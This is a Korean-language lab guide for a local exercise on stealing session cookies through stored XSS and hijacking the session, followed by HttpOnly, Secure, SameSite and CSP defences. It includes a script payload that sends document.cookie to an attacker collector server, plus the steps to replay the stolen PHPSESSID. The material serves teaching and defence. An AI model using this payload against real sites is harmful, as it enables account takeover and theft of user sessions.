# 05. 세션 하이재킹 실습

> xss.md 연결: 1장 (세션 하이재킹), 5장 (HttpOnly Cookie 방어)

## 전체 공격 흐름

```
[공격자]                    [피해자 앱]                [공격자 수집 서버]
                            localhost:8080             localhost:9000
                                  |
공격자가 게시판에                   |
XSS 페이로드 등록 ──────────────> DB 저장
                                  |
                            피해자가 페이지 접속
                                  |
                        브라우저가 스크립트 실행
                        document.cookie 읽기
                                  |
                        Image 요청으로 쿠키 전송 ────> collector.php
                                                      log.txt에 기록
                                                           |
공격자가 log.txt 확인 <──────────────────────────────────┘
세션 ID 복사 → 브라우저 쿠키에 수동 세팅
→ 피해자 계정으로 접근!
```

## 실행 방법

**터미널 2개 동시에 실행**:

```bash
# 터미널 1: 피해자 앱 (포트 8080)
php -S localhost:8080 -t xss/05-session-hijack/victim/

# 터미널 2: 공격자 수집 서버 (포트 9000)
php -S localhost:9000 -t xss/05-session-hijack/attacker/
```

## 단계별 공격 방법

### Step 1. 피해자로 로그인

1. `http://localhost:8080/login.php` 접속
2. `victim` / `password123` 로그인
3. 마이페이지에서 현재 쿠키 확인 (`PHPSESSID=xxxx`)

### Step 2. XSS 페이로드로 세션 탈취

마이페이지의 게시글 작성 폼에서:

**제목에 입력**:
```html
<script>new Image().src="http://localhost:9000/collector.php?c="+document.cookie</script>
```

등록 버튼 클릭.

### Step 3. 쿠키 수집 확인

```bash
cat xss/05-session-hijack/attacker/log.txt
```

출력 예시:
```
[2026-03-17 12:00:00] IP: 127.0.0.1
Cookie: PHPSESSID=abc123def456
UA: Mozilla/5.0...
```

### Step 4. 세션 탈취 (다른 브라우저에서)

1. 다른 브라우저 (또는 시크릿 탭) 열기
2. `http://localhost:8080/mypage.php` 접속 → 로그인 페이지로 리다이렉트
3. **DevTools → Application → Cookies** 에서 새 쿠키 추가:
   - Name: `PHPSESSID`
   - Value: `(log.txt에서 복사한 값)`
   - Domain: `localhost`
4. 페이지 새로고침 → **피해자 계정으로 로그인된 상태!**

## 방어 방법

### HttpOnly Cookie 활성화

```php
// ❌ 취약 (현재)
session_set_cookie_params(['httponly' => false]);

// ✅ 안전
session_set_cookie_params(['httponly' => true]);
```

HttpOnly = true 시 `document.cookie`로 PHPSESSID 접근 불가 → XSS로 탈취 불가.

### 추가 방어

- `Secure` 플래그: HTTPS에서만 쿠키 전송
- `SameSite=Strict`: CSRF도 함께 방어
- CSP 헤더: inline 스크립트 자체를 차단
